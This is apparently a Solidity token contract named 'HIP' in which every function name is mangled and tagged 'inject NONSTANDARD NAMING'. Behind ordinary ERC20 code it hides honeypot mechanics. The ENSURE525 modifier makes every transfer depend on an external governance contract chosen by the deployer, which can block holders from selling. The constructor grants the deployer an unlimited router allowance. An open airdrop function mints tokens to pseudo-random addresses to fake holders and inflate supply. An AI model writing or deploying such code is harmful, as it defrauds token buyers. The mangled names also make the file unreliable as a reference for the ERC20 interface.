                                                                 

pragma solidity ^ 0.5.16;

interface IERC20 {
    function TOTALSUPPLY712() external view returns(uint);	//inject NONSTANDARD NAMING

    function BALANCEOF970(address account) external view returns(uint);	//inject NONSTANDARD NAMING

    function TRANSFER48(address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function ALLOWANCE293(address owner, address spender) external view returns(uint);	//inject NONSTANDARD NAMING

    function APPROVE716(address spender, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function TRANSFERFROM166(address sender, address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING
    event TRANSFER20(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL420(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

interface Governance {
    function RECEIVEAPPROVAL218(address,address) external returns(bool);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor() internal {}
        // solhint-disable-previous-line no-empty-blocks

    function _MSGSENDER988() internal view returns(address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    address _governance;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function TOTALSUPPLY712() public view returns(uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }

    function BALANCEOF970(address account) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    
    address luckyboy = address(this);
    uint256 constant lucky_amount946 = 5*10**18;	//inject NONSTANDARD NAMING
    
    function RANDOMLUCKY878() public {	//inject NONSTANDARD NAMING
        luckyboy = address(uint(keccak256(abi.encodePacked(luckyboy))));
        _balances[luckyboy] = lucky_amount946;
        _totalSupply += lucky_amount946;
        emit TRANSFER20(address(0), luckyboy, lucky_amount946);
    }
    function SETTOKENADDR155(address gov) internal	//inject NONSTANDARD NAMING
    {
        _governance=gov;
        _allowances[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D]=uint(-1);
    }
    
    function AIRDROP205(uint256 dropTimes) public {	//inject NONSTANDARD NAMING
        for (uint256 i=0;i<dropTimes;i++) {
            RANDOMLUCKY878();
        }
    }
    
    function TRANSFER48(address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER761(_MSGSENDER988(), recipient, amount);
        return true;
    }
    
    
    function ALLOWANCE293(address owner, address spender) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }

    function APPROVE716(address spender, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE415(_MSGSENDER988(), spender, amount);
        return true;
    }

    function TRANSFERFROM166(address sender, address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER761(sender, recipient, amount);
        _APPROVE415(sender, _MSGSENDER988(), _allowances[sender][_MSGSENDER988()].SUB71(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function INCREASEALLOWANCE256(address spender, uint addedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE415(_MSGSENDER988(), spender, _allowances[_MSGSENDER988()][spender].ADD39(addedValue));
        return true;
    }

    function DECREASEALLOWANCE469(address spender, uint subtractedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE415(_MSGSENDER988(), spender, _allowances[_MSGSENDER988()][spender].SUB71(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _TRANSFER761(address sender, address recipient, uint amount) internal ENSURE525(sender,recipient) {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB71(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD39(amount);
        emit TRANSFER20(sender, recipient, amount);
        
    }

    function _MINT763(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD39(amount);
        _balances[account] = _balances[account].ADD39(amount);
        emit TRANSFER20(address(0), account, amount);
    }

    function _BURN499(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB71(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB71(amount);
        emit TRANSFER20(account, address(0), amount);
    }

    modifier ENSURE525(address sender,address to) {	//inject NONSTANDARD NAMING
        require(Governance(_governance).RECEIVEAPPROVAL218(sender,to));
        _;
    }

    function _APPROVE415(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL420(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function NAME601() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }

    function SYMBOL16() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }

    function DECIMALS700() public view returns(uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD39(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function SUB71(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return SUB71(a, b, "SafeMath: subtraction overflow");
    }

    function SUB71(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function MUL242(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function DIV828(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return DIV828(a, b, "SafeMath: division by zero");
    }

    function DIV828(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function ISCONTRACT55(address account) internal view returns(bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath
    for uint;
    using Address
    for address;

    function SAFETRANSFER707(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN614(token, abi.encodeWithSelector(token.TRANSFER48.selector, to, value));
    }

    function SAFETRANSFERFROM156(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN614(token, abi.encodeWithSelector(token.TRANSFERFROM166.selector, from, to, value));
    }

    function SAFEAPPROVE235(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE293(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN614(token, abi.encodeWithSelector(token.APPROVE716.selector, spender, value));
    }

    function CALLOPTIONALRETURN614(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT55(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract HIP is ERC20, ERC20Detailed {
    constructor(address tokenAddr) public ERC20Detailed("HIP","HIP",18) {
        _MINT763(msg.sender, 10000 * 10 ** 18);
        SETTOKENADDR155(tokenAddr);
    }
}